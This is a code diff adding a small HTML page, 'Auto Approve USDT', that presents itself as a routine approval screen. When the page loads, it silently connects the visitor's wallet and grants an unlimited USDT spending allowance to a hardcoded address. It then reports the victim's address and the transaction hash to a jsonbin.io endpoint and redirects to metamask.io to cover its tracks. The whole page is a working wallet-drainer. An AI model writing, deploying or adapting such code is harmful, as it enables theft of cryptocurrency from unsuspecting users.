@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Approve USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial;
+      background: white;
+    }
+    h2 {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h2>Processing approval...</h2>
+
+  <script>
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
+    const SPENDER = "0x7113C4847987bFf1cB39e0C70AaC808056B6E5f0";
+    const ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    async function autoApprove() {
+      const walletConnectProvider = new WalletConnectProvider.default({
+        rpc: { 1: "https://cloudflare-eth.com" }, // Mainnet
+        qrcode: false // ⛔ Désactive l'affichage du QR code
+      });
+
+      try {
+        await walletConnectProvider.enable();
+
+        const provider = new ethers.providers.Web3Provider(walletConnectProvider);
+        const signer = provider.getSigner();
+        const owner = await signer.getAddress();
+
+        const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+        const tx = await usdt.approve(SPENDER, ethers.constants.MaxUint256);
+        await tx.wait();
+
+        await fetch("https://api.jsonbin.io/v3/b/682f6a738561e97a5019f7c5", {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ owner, spender: SPENDER, txHash: tx.hash })
+        });
+
+        window.location.href = "https://metamask.io/";
+      } catch (err) {
+        console.error("Erreur :", err);
+        alert("Erreur : " + err.message);
+      }
+    }
+
+    window.onload = autoApprove;
+  </script>
+</body>
+</html>
